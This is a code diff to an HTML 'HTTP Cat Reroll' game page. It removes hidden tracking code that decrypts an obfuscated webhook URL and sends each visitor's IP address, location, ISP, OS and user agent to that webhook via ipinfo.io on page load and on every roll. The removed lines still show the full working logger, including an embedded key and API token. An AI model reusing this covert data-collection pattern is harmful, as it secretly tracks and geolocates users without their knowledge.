@@ -127,7 +127,7 @@
 <body>
 
   <main>
-    <h1>HTTP Cat Reroll</h1>
+    <h1></h1>
     <div id="catContainer">
       <img id="catImg" src="" alt="HTTP cat" />
     </div>
@@ -141,7 +141,6 @@
     </div>
   </main>
 
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
   <script>
     const cats = [
       { code: 200, rarity: "Common" },
@@ -186,8 +185,6 @@
     let inventory = JSON.parse(localStorage.getItem("inventory") || "{}");
     let lastCat = JSON.parse(localStorage.getItem("lastCat")) || getRandomCat();
     let animating = false;
-
-    // Roll counter saved in localStorage
     let rollCount = parseInt(localStorage.getItem("rollCount") || "0");
     rollCounterDiv.textContent = `Rolls: ${rollCount}`;
 
@@ -238,68 +235,6 @@
       lastCat = cat;
     }
 
-    // Encryption stuff
-    const secretKey = "deadPenguin37156";
-    const encryptedWebhook = "U2FsdGVkX18Hn41CN6oi6wzT2+dcKyZ4cO0U+jDXpxKfBXuJbdeE44X68ijSa/OMTV+kCZcR8juoCxBA3J3tiw==";
-
-    function decryptWebhook(enc) {
-      const bytes = CryptoJS.AES.decrypt(enc, secretKey);
-      return bytes.toString(CryptoJS.enc.Utf8);
-    }
-
-    const webhookUrl = decryptWebhook(encryptedWebhook);
-
-    async function sendWebhook(data) {
-      try {
-        await fetch(webhookUrl, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(data),
-        });
-      } catch (e) {
-        console.error("Webhook send failed:", e);
-      }
-    }
-
-    async function gatherAndSendInfo() {
-      // Get basic info
-      const os = navigator.platform || "Unknown";
-      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";
-      const referrer = document.referrer || "None";
-      const userAgent = navigator.userAgent || "Unknown";
-
-      // Get IP info from ipinfo.io
-      let ipInfo = {};
-      try {
-        const token = "4ca57ffa6e1fc4"; // your ipinfo token
-        const res = await fetch(`https://ipinfo.io/json?token=${token}`);
-        ipInfo = await res.json();
-      } catch {
-        ipInfo = { error: "Failed to fetch IP info" };
-      }
-
-      // Compose webhook data
-      const embed = {
-        title: "User info log",
-        color: 0xff4500,
-        fields: [
-          { name: "OS", value: os, inline: true },
-          { name: "Timezone", value: timezone, inline: true },
-          { name: "ISP", value: ipInfo.org || "Unknown", inline: true },
-          { name: "Referrer", value: referrer, inline: false },
-          { name: "User Agent", value: userAgent, inline: false },
-          { name: "IP", value: ipInfo.ip || "Unknown", inline: true },
-          { name: "City", value: ipInfo.city || "Unknown", inline: true },
-          { name: "Region", value: ipInfo.region || "Unknown", inline: true },
-          { name: "Country", value: ipInfo.country || "Unknown", inline: true },
-          { name: "Location", value: ipInfo.loc || "Unknown", inline: false },
-        ],
-        timestamp: new Date().toISOString(),
-      };
-
-      await sendWebhook({ embeds: [embed] });
-    }
-
     function reroll() {
       if (animating) return;
       animating = true;
@@ -320,7 +255,6 @@
         const finalCat = getRandomCat();
         showCat(finalCat);
 
-        // Update roll count
         rollCount++;
         localStorage.setItem("rollCount", rollCount);
         rollCounterDiv.textContent = `Rolls: ${rollCount}`;
@@ -331,14 +265,10 @@
 
     rerollBtn.onclick = () => {
       reroll();
-      gatherAndSendInfo(); // send info on every roll
     };
 
-    // Show last cat and inventory on load
     showCat(lastCat);
     renderInventory();
-    gatherAndSendInfo(); // also send info on page load
-
   </script>
 </body>
 </html>
